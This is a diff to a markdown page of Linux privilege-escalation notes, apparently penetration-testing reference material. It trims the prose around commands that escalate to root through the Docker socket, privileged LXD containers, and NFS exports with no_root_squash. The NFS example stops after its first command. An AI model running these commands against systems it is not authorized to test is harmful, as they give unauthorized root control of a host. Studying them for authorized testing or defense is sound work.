@@ -2,7 +2,7 @@
 
 [← Linux quick reference](../03-linux-privesc.md)
 
-Group membership is a lead. Check the matching socket, daemon mode, export, or mount before treating it as a root path.
+Check matching socket, daemon mode, export, or mount; group name alone is insufficient.
 
 ```bash
 id
@@ -14,13 +14,13 @@ docker version 2>/dev/null
 lxc list 2>/dev/null
 ```
 
-If the daemon is rootful and your user can reach its Docker socket, a container can mount the host filesystem:
+Rootful Docker socket accessible:
 
 ```bash
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
-For an accessible LXD daemon and a suitable image:
+Accessible LXD daemon + suitable image:
 
 ```bash
 lxc init alpine c -c security.privileged=true
@@ -29,7 +29,7 @@ lxc start c
 lxc exec c sh
 ```
 
-Rootless Docker does not give the same host-root access. A group name without socket access proves little.
+Rootless Docker ≠ host root.
 
 ## NFS
 
@@ -39,7 +39,7 @@ findmnt
 showmount -e <NFS-SERVER>
 ```
 
-`no_root_squash` disables the usual mapping of client UID 0 to an anonymous user. Confirm that the export is writable and reachable before trying the path below. The example requires root on the client and a compatible Bash binary.
+`no_root_squash` + writable export + client root + compatible Bash binary:
 
 ```bash
 mkdir /mnt/x
